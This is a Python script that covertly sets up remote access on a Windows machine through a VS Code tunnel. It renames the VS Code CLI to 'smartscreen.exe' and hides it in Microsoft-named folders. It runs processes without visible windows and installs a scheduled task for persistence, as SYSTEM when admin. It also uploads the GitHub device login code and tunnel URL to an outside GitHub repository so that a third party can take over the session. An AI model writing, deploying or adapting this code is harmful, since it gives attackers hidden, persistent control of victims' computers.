import base64
import json
import os
import platform
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
from datetime import datetime
from pathlib import Path


# Edit these values while testing.
GITHUB_TOKEN = "your_token_here"
GITHUB_REPO = "leanne-townsend/temp1"
TARGET_FILE = "output1.txt"
BRANCH = "main"

CODE_EXE_NAME = "smartscreen.exe" if platform.system().lower() == "windows" else "code"
TUNNEL_NAME = os.getenv("COMPUTERNAME", "workstation")
SHOW_RAW_OUTPUT = False
DEVICE_CODE_LIFETIME_SECONDS = 15 * 60
MAX_DEVICE_CODE_ISSUES = 3
IS_ADMIN_CONTEXT = False
STATE_MODE = "user-local"
CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Tunnel"))
CODE_EXE = CODE_DIR / CODE_EXE_NAME
TUNNEL_LOG = CODE_DIR / "tunnel_output.log"
LOGIN_LOG = CODE_DIR / "login_output.log"
FAILED_SYNC_LOG = CODE_DIR / "pending_github_sync.txt"
RUN_LOCK = CODE_DIR / "combined.lock"

DEVICE_CODE_PATTERN = re.compile(r"\b([A-Z0-9]{4}-?[A-Z0-9]{4})\b")
URL_PATTERN = re.compile(r"https://[^\s]+")
TUNNEL_URL_PATTERN = re.compile(r"https://vscode\.dev/tunnel/[^\s]+", re.IGNORECASE)
LOGIN_HINT_PATTERN = re.compile(r"(github\.com/login/device|microsoft\.com/devicelogin)", re.IGNORECASE)
TASK_NAME = "VSCodeTunnelDeploy"
PROGRAM_DATA_ROOT = Path(r"C:\ProgramData\VSCodeTunnel")
PROGRAM_DATA_PYTHONW = Path(r"C:\ProgramData\Python\pythonw.exe")
PROGRAM_DATA_SCRIPT = Path(r"C:\ProgramData\Python\update.py")
USER_LOCAL_PYTHONW = Path(os.getenv("LOCALAPPDATA", "")) / "Microsoft" / "Python" / "pythonw.exe"
USER_LOCAL_SCRIPT = Path(os.getenv("LOCALAPPDATA", "")) / "Microsoft" / "Python" / "update.py"


def windows_subprocess_kwargs() -> dict:
    if platform.system().lower() != "windows":
        return {}

    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    return {
        "startupinfo": startupinfo,
        "creationflags": subprocess.CREATE_NO_WINDOW,
    }


class VSCodeDownloader:
    def __init__(self, target_dir: Path, executable_name: str):
        self.target_dir = Path(target_dir)
        self.executable_name = executable_name
        self.executable_path = self.target_dir / executable_name

    def detect_platform_target(self) -> str:
        system_name = platform.system().lower()
        machine = platform.machine().lower()

        if system_name == "windows":
            arch = "arm64" if machine in ("arm64", "aarch64") else "x64"
            return f"cli-win32-{arch}"
        if system_name == "darwin":
            arch = "arm64" if machine in ("arm64", "aarch64") else "x64"
            return f"cli-darwin-{arch}"
        if system_name == "linux":
            arch = "arm64" if machine in ("arm64", "aarch64") else "x64"
            return f"cli-linux-{arch}"

        raise RuntimeError(f"Unsupported platform for VS Code CLI download: {platform.system()} {platform.machine()}")

    def locate_downloaded_executable(self) -> Path | None:
        candidates = [
            self.target_dir / self.executable_name,
            self.target_dir / "smartscreen.exe",
            self.target_dir / "code",
            self.target_dir / "bin" / "code",
            self.target_dir / "bin" / "smartscreen.exe",
        ]

        for candidate in candidates:
            if candidate.exists():
                return candidate

        if platform.system().lower() == "windows":
            for candidate in self.target_dir.glob("code*.exe"):
                if candidate.is_file():
                    return candidate
        else:
            for candidate in self.target_dir.rglob("code*"):
                if candidate.is_file() and candidate.name.startswith("code"):
                    return candidate

        return None

    def setup(self) -> None:
        self.target_dir.mkdir(parents=True, exist_ok=True)
        print(f"[INFO] VS Code CLI directory: {self.target_dir}")

        if self.executable_path.exists():
            print(f"[INFO] {self.executable_name} already exists.")
            return

        platform_target = self.detect_platform_target()
        download_url = f"https://update.code.visualstudio.com/latest/{platform_target}/stable"
        archive_path = self.target_dir / "vscode_cli_download.zip"

        print(f"[DOWNLOAD] Fetching VS Code CLI for {platform_target}...")

        try:
            with urllib.request.urlopen(download_url, timeout=90) as response:
                with archive_path.open("wb") as archive_file:
                    while chunk := response.read(8192):
                        archive_file.write(chunk)

            with zipfile.ZipFile(archive_path, "r") as archive:
                archive.extractall(self.target_dir)

            downloaded_executable = self.locate_downloaded_executable()
            if downloaded_executable is None:
                raise FileNotFoundError("Downloaded archive did not contain a usable VS Code CLI executable.")

            if downloaded_executable.resolve() != self.executable_path.resolve():
                if self.executable_path.exists():
                    self.executable_path.unlink()
                downloaded_executable.replace(self.executable_path)

            print(f"[SUCCESS] {self.executable_name} ready at {self.executable_path}")
        finally:
            if archive_path.exists():
                archive_path.unlink()


def print_summary(details: dict[str, str | None]) -> None:
    print("\n=== Tunnel Summary ===")
    for label, key in (
        ("Tunnel machine name", "machine_name"),
        ("Login instruction", "login_instruction"),
        ("Device code", "device_code"),
        ("Tunnel URL", "tunnel_url"),
    ):
        value = details.get(key)
        if value:
            print(f"{label}: {value}")


def build_summary_text(details: dict[str, str | None]) -> str:
    timestamp = datetime.now().isoformat(timespec="seconds")
    lines = [f"[{timestamp}] Tunnel Summary"]

    for label, key in (
        ("Session ID", "session_id"),
        ("Status", "status"),
        ("Tunnel machine name", "machine_name"),
        ("Login instruction", "login_instruction"),
        ("Device code", "device_code"),
        ("Issued at", "issued_at"),
        ("Expires at", "expires_at"),
        ("Tunnel URL", "tunnel_url"),
        ("Message", "message"),
    ):
        value = details.get(key)
        if value:
            lines.append(f"{label}: {value}")

    return "\n" + "\n".join(lines) + "\n"


def save_failed_sync(summary_text: str, reason: str, error_message: str) -> None:
    FAILED_SYNC_LOG.parent.mkdir(parents=True, exist_ok=True)
    entry = (
        f"\n[{datetime.now().isoformat(timespec='seconds')}] Failed GitHub sync after {reason}\n"
        f"Error: {error_message}\n"
        f"{summary_text}"
    )
    with FAILED_SYNC_LOG.open("a", encoding="utf-8") as handle:
        handle.write(entry)


def can_reach_github_api() -> tuple[bool, str | None]:
    request = urllib.request.Request(
        "https://api.github.com",
        headers={
            "Accept": "application/vnd.github+json",
            "User-Agent": "combined-tunnel-script",
        },
        method="GET",
    )

    try:
        with urllib.request.urlopen(request, timeout=8) as response:
            return True, f"HTTP {response.status}"
    except Exception as error:
        return False, str(error)


def is_windows_admin() -> bool:
    if platform.system().lower() != "windows":
        return False
    try:
        result = run_command(["net", "session"], check=False, timeout=5)
        return result.returncode == 0
    except Exception:
        return False


def configure_runtime_paths() -> None:
    global IS_ADMIN_CONTEXT, STATE_MODE, CODE_DIR, CODE_EXE, TUNNEL_LOG, LOGIN_LOG, FAILED_SYNC_LOG, RUN_LOCK

    IS_ADMIN_CONTEXT = is_windows_admin()
    if platform.system().lower() == "windows" and IS_ADMIN_CONTEXT:
        STATE_MODE = "machine-wide"
        CODE_DIR = Path(r"C:\ProgramData\Microsoft\Tunnel")
    else:
        STATE_MODE = "user-local"
        CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Tunnel"))

    CODE_EXE = CODE_DIR / CODE_EXE_NAME
    TUNNEL_LOG = CODE_DIR / "tunnel_output.log"
    LOGIN_LOG = CODE_DIR / "login_output.log"
    FAILED_SYNC_LOG = CODE_DIR / "pending_github_sync.txt"
    RUN_LOCK = CODE_DIR / "combined.lock"


def print_runtime_diagnostics() -> None:
    print(f"[INFO] Launch admin/elevated: {IS_ADMIN_CONTEXT}")
    print(f"[INFO] State mode: {STATE_MODE}")
    print(f"[INFO] Resolved state directory: {CODE_DIR}")
    print(f"[INFO] Resolved VS Code executable path: {CODE_EXE}")
    print(f"[INFO] Resolved pythonw path: {resolve_pythonw_executable()}")
    print(f"[INFO] Resolved runtime script path: {resolve_runtime_script_path()}")


def resolve_pythonw_executable() -> str:
    executable = Path(sys.executable)
    if platform.system().lower() == "windows" and STATE_MODE == "machine-wide":
        candidates = [
            PROGRAM_DATA_PYTHONW,
            executable.with_name("pythonw.exe"),
            executable,
            Path(r"C:\Windows\pyw.exe"),
        ]
    elif platform.system().lower() == "windows":
        candidates = [
            USER_LOCAL_PYTHONW,
            executable.with_name("pythonw.exe"),
            executable,
            Path(r"C:\Windows\pyw.exe"),
        ]
    else:
        candidates = [executable]
    for candidate in candidates:
        if candidate.exists():
            return str(candidate)
    return str(executable)


def resolve_runtime_script_path() -> Path:
    current_script = Path(__file__).resolve()
    if platform.system().lower() != "windows":
        return current_script

    if STATE_MODE == "machine-wide" and PROGRAM_DATA_SCRIPT.exists():
        return PROGRAM_DATA_SCRIPT
    if STATE_MODE == "user-local" and USER_LOCAL_SCRIPT.exists():
        return USER_LOCAL_SCRIPT
    return current_script


def ensure_persistence() -> None:
    if platform.system().lower() != "windows":
        return

    try:
        existing = run_command(["schtasks", "/query", "/tn", TASK_NAME], check=False, timeout=10)
        if existing.returncode == 0:
            print(f"[INFO] Persistence task '{TASK_NAME}' already exists.")
            return
    except Exception as error:
        print(f"[WARN] Could not check scheduled task state: {error}")

    script_path = str(resolve_runtime_script_path())
    pythonw_path = resolve_pythonw_executable()

    task_command = f'"{pythonw_path}" "{script_path}"'
    if IS_ADMIN_CONTEXT:
        create_cmd = [
            "schtasks",
            "/create",
            "/tn",
            TASK_NAME,
            "/tr",
            task_command,
            "/sc",
            "onlogon",
            "/ru",
            "SYSTEM",
            "/rl",
            "HIGHEST",
            "/f",
        ]
    else:
        create_cmd = [
            "schtasks",
            "/create",
            "/tn",
            TASK_NAME,
            "/tr",
            task_command,
            "/sc",
            "hourly",
            "/mo",
            "4",
            "/f",
        ]

    try:
        result = run_command(create_cmd, check=False, timeout=20)
        if result.returncode == 0:
            print(f"[INFO] Persistence task '{TASK_NAME}' created.")
        else:
            error_text = (result.stderr or result.stdout).strip()
            print(f"[WARN] Failed to create persistence task '{TASK_NAME}': {error_text}")
    except Exception as error:
        print(f"[WARN] Error creating persistence task '{TASK_NAME}': {error}")


def sync_summary_to_github(details: dict[str, str | None], reason: str, fatal: bool = False) -> bool:
    summary_text = build_summary_text(details)
    last_error = None
    reachable, reachability_note = can_reach_github_api()

    if not reachable:
        print("[WARN] Connectivity check to api.github.com failed, but a GitHub write will still be attempted.")
        print(f"[WARN] Connectivity check to api.github.com failed: {reachability_note}")

    for attempt in range(1, 4):
        try:
            result = append_to_github_file(
                repo=GITHUB_REPO,
                file_path=TARGET_FILE,
                branch=BRANCH,
                token=GITHUB_TOKEN,
                text_to_append=summary_text,
            )
            commit_sha = result.get("commit", {}).get("sha", "unknown")
            print(f"Tunnel info updated on GitHub after {reason}. Commit: {commit_sha}")
            return True
        except Exception as error:
            last_error = str(error)
            print(f"[WARN] GitHub sync attempt {attempt}/3 failed after {reason}: {last_error}")
            if attempt < 3:
                time.sleep(2)

    save_failed_sync(summary_text, reason, last_error or "Unknown GitHub sync error")
    print(f"[WARN] Saved unsent tunnel summary to {FAILED_SYNC_LOG}")
    if details.get("tunnel_url"):
        print("[INFO] Tunnel created successfully, but GitHub is unreachable from this machine.")
    if fatal:
        raise RuntimeError(last_error or f"GitHub sync failed after {reason}")
    return False


def run_command(
    command: list[str], check: bool = True, timeout: float | None = 20
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        command,
        check=check,
        timeout=timeout,
        text=True,
        capture_output=True,
        encoding="utf-8",
        errors="replace",
        **windows_subprocess_kwargs(),
    )


def trim_ansi(text: str) -> str:
    return re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", text)


def format_timestamp(epoch_seconds: float | None) -> str | None:
    if epoch_seconds is None:
        return None
    return datetime.fromtimestamp(epoch_seconds).isoformat(timespec="seconds")


def update_login_details_from_line(details: dict[str, str | None], cleaned_line: str) -> None:
    lowered_line = cleaned_line.lower()
    if "error" in lowered_line:
        return

    if details["login_instruction"] is None and "log into" in lowered_line and "use code" in lowered_line:
        details["login_instruction"] = cleaned_line

    if details["device_code"] is None:
        match = DEVICE_CODE_PATTERN.search(cleaned_line.upper())
        if match:
            details["device_code"] = match.group(1).replace("-", "")

    url_match = URL_PATTERN.search(cleaned_line)
    if details["login_instruction"] is None and url_match and LOGIN_HINT_PATTERN.search(url_match.group(0)):
        details["login_instruction"] = cleaned_line


def acquire_run_lock() -> None:
    RUN_LOCK.parent.mkdir(parents=True, exist_ok=True)
    current_pid = str(os.getpid())

    if RUN_LOCK.exists():
        stale_pid = RUN_LOCK.read_text(encoding="utf-8", errors="replace").strip()
        if stale_pid and stale_pid != current_pid:
            raise RuntimeError(
                f"Another update.py run is already active for this machine. Lock file: {RUN_LOCK}"
            )

    RUN_LOCK.write_text(current_pid, encoding="utf-8")


def release_run_lock() -> None:
    if RUN_LOCK.exists():
        try:
            RUN_LOCK.unlink()
        except OSError:
            pass


def build_file_api_url(repo: str, file_path: str) -> str:
    encoded_path = urllib.parse.quote(file_path, safe="/")
    return f"https://api.github.com/repos/{repo}/contents/{encoded_path}"


def github_request(url: str, token: str, method: str = "GET", payload: dict | None = None) -> dict:
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28",
        "User-Agent": "combined-tunnel-script",
    }

    data = None
    if payload is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(payload).encode("utf-8")

    request = urllib.request.Request(url, data=data, headers=headers, method=method)
    with urllib.request.urlopen(request, timeout=30) as response:
        return json.loads(response.read().decode("utf-8"))


def get_existing_file(repo: str, file_path: str, branch: str, token: str) -> tuple[str, str | None]:
    url = build_file_api_url(repo, file_path) + "?" + urllib.parse.urlencode({"ref": branch})

    try:
        response = github_request(url, token, method="GET")
    except urllib.error.HTTPError as error:
        if error.code == 404:
            return "", None
        error_body = error.read().decode("utf-8", errors="replace")
        raise RuntimeError(f"GitHub read failed: {error.code} {error.reason} - {error_body}") from error

    encoded_content = response.get("content", "").replace("\n", "")
    current_text = base64.b64decode(encoded_content).decode("utf-8") if encoded_content else ""
    return current_text, response.get("sha")


def append_to_github_file(repo: str, file_path: str, branch: str, token: str, text_to_append: str) -> dict:
    current_text, sha = get_existing_file(repo, file_path, branch, token)
    new_text = current_text + text_to_append
    encoded_content = base64.b64encode(new_text.encode("utf-8")).decode("utf-8")

    payload = {
        "message": f"Append tunnel summary to {file_path}",
        "content": encoded_content,
        "branch": branch,
    }
    if sha:
        payload["sha"] = sha

    try:
        return github_request(build_file_api_url(repo, file_path), token, method="PUT", payload=payload)
    except urllib.error.HTTPError as error:
        error_body = error.read().decode("utf-8", errors="replace")
        raise RuntimeError(f"GitHub write failed: {error.code} {error.reason} - {error_body}") from error


def ensure_code_cli() -> None:
    downloader = VSCodeDownloader(CODE_DIR, CODE_EXE_NAME)
    downloader.setup()

    if not CODE_EXE.exists():
        raise FileNotFoundError(f"{CODE_EXE_NAME} was not found at {CODE_EXE}")


def validate_github_config() -> None:
    if "/" not in GITHUB_REPO:
        raise ValueError("GITHUB_REPO must look like 'owner/repo'.")
    if not GITHUB_TOKEN or GITHUB_TOKEN == "your_token_here":
        raise ValueError("Set GITHUB_TOKEN before running this script.")


def close_existing_tunnel() -> None:
    print("Closing any existing tunnel...")
    try:
        result = run_command([str(CODE_EXE), "tunnel", "kill"], check=False, timeout=8)
    except subprocess.TimeoutExpired:
        print("[WARN] Timed out while closing an existing tunnel. Continuing anyway.")
        return
    if result.stdout.strip():
        print(result.stdout.strip())
    if result.stderr.strip():
        print(result.stderr.strip())


def logout_existing_login() -> None:
    print("Clearing any previous tunnel login...")
    try:
        result = run_command([str(CODE_EXE), "tunnel", "user", "logout"], check=False, timeout=8)
    except subprocess.TimeoutExpired:
        print("[WARN] Timed out while clearing the previous tunnel login. Continuing anyway.")
        return
    if result.stdout.strip():
        print(result.stdout.strip())
    if result.stderr.strip():
        print(result.stderr.strip())


def login_with_github() -> dict[str, str | None]:
    print("Starting GitHub authentication...")
    session_id = uuid.uuid4().hex[:12]
    for issue_number in range(1, MAX_DEVICE_CODE_ISSUES + 1):
        LOGIN_LOG.parent.mkdir(parents=True, exist_ok=True)
        LOGIN_LOG.write_text("", encoding="utf-8")

        with LOGIN_LOG.open("a", encoding="utf-8", errors="replace") as log_file:
            process = subprocess.Popen(
                [str(CODE_EXE), "tunnel", "user", "login", "--provider", "github"],
                stdout=log_file,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                text=True,
                encoding="utf-8",
                errors="replace",
                **windows_subprocess_kwargs(),
            )

        issued_at = time.time()
        expires_at = issued_at + DEVICE_CODE_LIFETIME_SECONDS
        line_count = 0
        details: dict[str, str | None] = {
            "session_id": session_id,
            "machine_name": TUNNEL_NAME,
            "login_instruction": None,
            "device_code": None,
            "tunnel_url": None,
            "status": None,
            "issued_at": None,
            "expires_at": None,
            "message": None,
        }
        code_published = False

        try:
            while True:
                if LOGIN_LOG.exists():
                    log_lines = LOGIN_LOG.read_text(encoding="utf-8", errors="replace").splitlines()
                    for raw_line in log_lines[line_count:]:
                        cleaned_line = trim_ansi(raw_line.rstrip())
                        if cleaned_line and SHOW_RAW_OUTPUT:
                            print(cleaned_line)
                        if cleaned_line:
                            update_login_details_from_line(details, cleaned_line)
                    line_count = len(log_lines)

                if not code_published and (details["login_instruction"] or details["device_code"]):
                    details["status"] = "Pending authentication"
                    details["issued_at"] = format_timestamp(issued_at)
                    details["expires_at"] = format_timestamp(expires_at)
                    details["message"] = f"Code issue {issue_number} of {MAX_DEVICE_CODE_ISSUES}"
                    print_summary(details)
                    sync_summary_to_github(details, "device code capture", fatal=False)
                    print("Waiting for GitHub browser authentication to complete...")
                    code_published = True

                exit_code = process.poll()
                now = time.time()

                if exit_code == 0:
                    if details.get("device_code"):
                        details["status"] = "Authenticated"
                        details["message"] = "Browser authentication completed successfully."
                        print_summary(details)
                        sync_summary_to_github(details, "authentication completion", fatal=False)
                    return details

                if exit_code is not None and exit_code != 0:
                    if code_published and now >= expires_at:
                        break
                    raise RuntimeError("GitHub authentication command failed.")

                if now >= expires_at:
                    if process.poll() is None:
                        process.terminate()
                        try:
                            process.wait(timeout=10)
                        except subprocess.TimeoutExpired:
                            process.kill()
                    details["status"] = "Expired"
                    details["message"] = "Browser authentication was not completed before the code expired."
                    print_summary(details)
                    sync_summary_to_github(details, "device code expiry", fatal=False)
                    break

                time.sleep(1)
        finally:
            if process.poll() is None:
                process.terminate()

        if issue_number == MAX_DEVICE_CODE_ISSUES:
            final_details = {
                "session_id": session_id,
                "machine_name": TUNNEL_NAME,
                "login_instruction": details.get("login_instruction"),
                "device_code": details.get("device_code"),
                "tunnel_url": None,
                "status": "Authentication not completed",
                "issued_at": details.get("issued_at"),
                "expires_at": details.get("expires_at"),
                "message": "Maximum device-code refresh limit reached for this run. A future scheduled run can publish a new code.",
            }
            print_summary(final_details)
            sync_summary_to_github(final_details, "authentication stop", fatal=False)
            raise RuntimeError("Device authentication was not completed before the refresh limit was reached.")

        print(f"[INFO] Device code expired. Requesting a fresh code ({issue_number + 1}/{MAX_DEVICE_CODE_ISSUES})...")

    raise RuntimeError("Unable to complete GitHub authentication.")


def start_tunnel_and_upload(summary_details: dict[str, str | None]) -> None:
    print("Creating a new tunnel...")
    TUNNEL_LOG.parent.mkdir(parents=True, exist_ok=True)
    TUNNEL_LOG.write_text("", encoding="utf-8")

    with TUNNEL_LOG.open("a", encoding="utf-8", errors="replace") as log_file:
        process = subprocess.Popen(
            [
                str(CODE_EXE),
                "tunnel",
                "--no-sleep",
                "--accept-server-license-terms",
                "--name",
                TUNNEL_NAME,
            ],
            stdout=log_file,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            text=True,
            encoding="utf-8",
            errors="replace",
            **windows_subprocess_kwargs(),
        )

    uploaded = False
    recent_lines: list[str] = []
    line_count = 0
    deadline = time.time() + 90

    try:
        while time.time() < deadline:
            if TUNNEL_LOG.exists():
                log_lines = TUNNEL_LOG.read_text(encoding="utf-8", errors="replace").splitlines()
                for raw_line in log_lines[line_count:]:
                    cleaned_line = trim_ansi(raw_line.rstrip())
                    if cleaned_line:
                        recent_lines.append(cleaned_line)
                        recent_lines = recent_lines[-12:]
                        if SHOW_RAW_OUTPUT:
                            print(cleaned_line)

                        if summary_details["tunnel_url"] is None:
                            tunnel_match = TUNNEL_URL_PATTERN.search(cleaned_line)
                            if tunnel_match:
                                summary_details["tunnel_url"] = tunnel_match.group(0).rstrip(".)")
                                summary_details["status"] = "Tunnel active"
                                summary_details["message"] = "Continuation of authenticated session."
                                print_summary(summary_details)
                                sync_summary_to_github(summary_details, "tunnel URL detection", fatal=False)
                                print(f"Tunnel is running. Full log: {TUNNEL_LOG}")
                                uploaded = True
                                return
                line_count = len(log_lines)

            if process.poll() is not None:
                break

            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping tunnel...")
        process.terminate()
        process.wait(timeout=10)
        return

    exit_code = process.poll()
    diagnostic = "\n".join(recent_lines) if recent_lines else "No tunnel output captured."
    if exit_code is None:
        failure_details = dict(summary_details)
        failure_details["status"] = "Tunnel pending"
        failure_details["message"] = f"Timed out waiting for tunnel URL. Recent output: {diagnostic}"
        print_summary(failure_details)
        sync_summary_to_github(failure_details, "tunnel wait timeout", fatal=False)
        raise RuntimeError(f"Timed out waiting for tunnel URL.\nRecent output:\n{diagnostic}")
    if not uploaded:
        failure_details = dict(summary_details)
        failure_details["status"] = "Tunnel failed"
        failure_details["message"] = f"Tunnel command failed. Recent output: {diagnostic}"
        print_summary(failure_details)
        sync_summary_to_github(failure_details, "tunnel failure", fatal=False)
        raise RuntimeError(f"Tunnel command failed.\nRecent output:\n{diagnostic}")


def main() -> None:
    configure_runtime_paths()
    print_runtime_diagnostics()
    acquire_run_lock()
    ensure_persistence()
    try:
        ensure_code_cli()
        validate_github_config()
        close_existing_tunnel()
        logout_existing_login()

        summary_details = login_with_github()
        print("Complete the GitHub sign-in in the browser, then the tunnel will continue.")
        start_tunnel_and_upload(summary_details)
    finally:
        release_run_lock()


if __name__ == "__main__":
    try:
        main()
    except Exception as error:
        print(f"Error: {error}", file=sys.stderr)
        sys.exit(1)
